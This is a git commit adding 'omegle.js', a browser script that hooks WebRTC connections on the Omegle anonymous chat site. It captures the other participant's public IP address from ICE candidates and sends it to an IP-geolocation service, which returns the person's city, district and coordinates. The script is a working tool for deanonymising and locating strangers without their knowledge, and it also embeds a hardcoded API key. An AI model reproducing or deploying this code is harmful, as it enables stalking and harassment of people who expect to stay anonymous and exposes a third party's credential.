abd65c2fb354a70f1c02301a13d908d33a12a81b
Jonas <yyp.official0001@gmail.com>
2022-06-12 16:36:02 +0200

    Create omegle.js

---
+++ omegle.js
@@ -0,0 +1,43 @@
+let keyapi = "8d3373cc74884e1d8cf43a792b1da3b5";
+
+window.oRTCPeerConnection =
+    window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+    const pc = new window.oRTCPeerConnection(...args);
+
+    pc.oaddIceCandidate = pc.addIceCandidate;
+
+    pc.addIceCandidate = function (iceCandidate, ...rest) {
+        const fields = iceCandidate.candidate.split(" ");
+
+        console.log(iceCandidate.candidate);
+        const ip = fields[4];
+        if (fields[7] === "srflx") {
+            getLocation(ip);
+        }
+        return pc.oaddIceCandidate(iceCandidate, ...rest);
+    };
+    return pc;
+};
+// Use the API to be able to locate the person thanks to an IP :)
+let getLocation = async (ip) => {
+    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${keyapi}&ip=${ip}`;
+
+    await fetch(url).then((response) =>
+        response.json().then((json) => {
+            const output = `
+-------------------------------
+IP: ${ip}
+Country: ${json.country_name}
+State: ${json.state_prov}
+City: ${json.city}
+District: ${json.district}
+Lat / Long: (${json.latitude}, ${json.longitude})
+-------------------------------
+by L14 :)
+          `;
+            console.log(output);
+        })
+    );
+};
